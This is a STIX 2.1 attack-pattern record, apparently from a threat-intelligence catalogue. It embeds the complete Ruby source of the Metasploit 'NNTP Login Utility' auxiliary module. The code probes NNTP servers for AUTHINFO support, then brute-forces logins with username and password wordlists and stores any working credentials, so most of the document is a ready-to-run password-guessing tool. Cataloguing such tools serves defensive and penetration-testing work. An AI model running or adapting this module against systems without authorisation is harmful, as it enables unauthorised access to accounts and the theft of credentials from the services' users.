{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ae55f68c-fdaf-42d8-a99b-ca1f091ea001",
    "created": "2024-08-14T16:26:36.097088Z",
    "modified": "2024-08-14T16:26:36.097093Z",
    "name": "NNTP Login Utility",
    "description": " This module attempts to authenticate to NNTP services which support the AUTHINFO authentication extension.  This module supports AUTHINFO USER/PASS authentication but does not support AUTHINFO GENERIC or AUTHINFO SASL authentication methods. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/nntp/nntp_login.rb",
            "external_id": "nntp_login.rb"
        },
        {
            "source_name": "reference",
            "url": "https://datatracker.ietf.org/doc/html/rfc3977"
        },
        {
            "source_name": "reference",
            "url": "https://datatracker.ietf.org/doc/html/rfc4642"
        },
        {
            "source_name": "reference",
            "url": "https://datatracker.ietf.org/doc/html/rfc4643))"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'NNTP Login Utility',\n      'Description' => %q{\n        This module attempts to authenticate to NNTP services\n        which support the AUTHINFO authentication extension.\n\n        This module supports AUTHINFO USER/PASS authentication,\n        but does not support AUTHINFO GENERIC or AUTHINFO SASL\n        authentication methods.\n      },\n      'Author'      => 'bcoles',\n      'License'     => MSF_LICENSE,\n      'References'  => [ [ 'CVE', '1999-0502' ], # Weak password\n                         [ 'URL', 'https://datatracker.ietf.org/doc/html/rfc3977' ],\n                         [ 'URL', 'https://datatracker.ietf.org/doc/html/rfc4642' ],\n                         [ 'URL', 'https://datatracker.ietf.org/doc/html/rfc4643' ] ]))\n    register_options(\n      [\n        Opt::RPORT(119),\n        OptPath.new('USER_FILE', [ false, 'The file that contains a list of probable usernames.',\n          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_users.txt') ]),\n        OptPath.new('PASS_FILE', [ false, 'The file that contains a list of probable passwords.',\n          File.join(Msf::Config.install_root, 'data', 'wordlists', 'unix_passwords.txt') ])\n      ])\n  end\n\n  def run_host(ip)\n    begin\n      connect\n      return :abort unless nntp?\n      return :abort unless supports_authinfo?\n\n      report_service :host  => rhost,\n                     :port  => rport,\n                     :proto => 'tcp',\n                     :name  => 'nntp'\n      disconnect\n\n      each_user_pass { |user, pass| do_login user, pass }\n    rescue ::Interrupt\n      raise $ERROR_INFO\n    rescue EOFError, ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      print_error \"#{peer} Connection failed\"\n      return\n    rescue OpenSSL::SSL::SSLError => e\n      print_error \"SSL negotiation failed: #{e}\"\n    rescue => e\n      print_error \"#{peer} Error: #{e.class} #{e} #{e.backtrace}\"\n      return\n    ensure\n      disconnect\n    end\n  end\n\n  def nntp?\n    banner = sock.get_once\n\n    if !banner\n      vprint_error \"#{peer} No response\"\n      return false\n    end\n\n    if banner !~ /^200/\n      print_error 'Unexpected reply'\n      return false\n    end\n\n    vprint_status 'Server is a NTTP server'\n    vprint_status \"Banner: #{banner}\"\n    true\n  end\n\n  def supports_authinfo?\n    sock.put \"HELP\\r\\n\"\n    res = sock.get(-1)\n    code = res.scan(/\\A(\\d+)\\s/).flatten.first.to_i\n\n    if code.nil?\n      print_error 'Server is not a NNTP server'\n      return false\n    end\n\n    if code == 480\n      vprint_warning 'Authentication is required before listing authentication capabilities.'\n      return true\n    end\n\n    if code == 100 && res =~ /authinfo/i\n      vprint_status 'Server supports AUTHINFO'\n      return true\n    end\n\n    print_error 'Server does not support AUTHINFO'\n    false\n  end\n\n  def do_login(user, pass)\n    vprint_status \"Trying username:'#{user}' with password:'#{pass}'\"\n\n    begin\n      connect\n      sock.get_once\n\n      sock.put \"AUTHINFO USER #{user}\\r\\n\"\n      res = sock.get_once\n      unless res\n        vprint_error \"#{peer} No response\"\n        return :abort\n      end\n\n      code = res.scan(/\\A(\\d+)\\s/).flatten.first.to_i\n      if code != 381\n        vprint_error \"#{peer} Unexpected reply. Skipping user...\"\n        return :skip_user\n      end\n\n      sock.put \"AUTHINFO PASS #{pass}\\r\\n\"\n      res = sock.get_once\n      unless res\n        vprint_error \"#{peer} No response\"\n        return :abort\n      end\n\n      code = res.scan(/\\A(\\d+)\\s/).flatten.first.to_i\n      if code == 452 || code == 481\n        vprint_error \"#{peer} Login failed\"\n        return\n      elsif code == 281\n        print_good \"#{peer} Successful login with: '#{user}' : '#{pass}'\"\n        report_cred ip:           rhost,\n                    port:         rport,\n                    service_name: 'nntp',\n                    user:         user,\n                    password:     pass,\n                    proof:        code.to_s\n        return :next_user\n      else\n        vprint_error \"#{peer} Failed login as: '#{user}' - Unexpected reply: #{res.inspect}\"\n        return\n      end\n    rescue EOFError, ::Rex::ConnectionError, ::Errno::ECONNREFUSED, ::Errno::ETIMEDOUT\n      print_error 'Connection failed'\n      return\n    rescue OpenSSL::SSL::SSLError => e\n      print_error \"SSL negotiation failed: #{e}\"\n      return :abort\n    end\n  rescue => e\n    print_error \"Error: #{e}\"\n    return nil\n  ensure\n    disconnect\n  end\n\n  def report_cred(opts)\n    service_data = { address: opts[:ip],\n                     port: opts[:port],\n                     service_name: opts[:service_name],\n                     protocol: 'tcp',\n                     workspace_id: myworkspace_id }\n\n    credential_data = { origin_type: :service,\n                        module_fullname: fullname,\n                        username: opts[:user],\n                        private_data: opts[:password],\n                        private_type: :password }.merge service_data\n\n    login_data = { last_attempted_at: DateTime.now,\n                   core: create_credential(credential_data),\n                   status: Metasploit::Model::Login::Status::SUCCESSFUL,\n                   proof: opts[:proof] }.merge service_data\n\n    create_credential_login login_data\n  end\nend\n"
}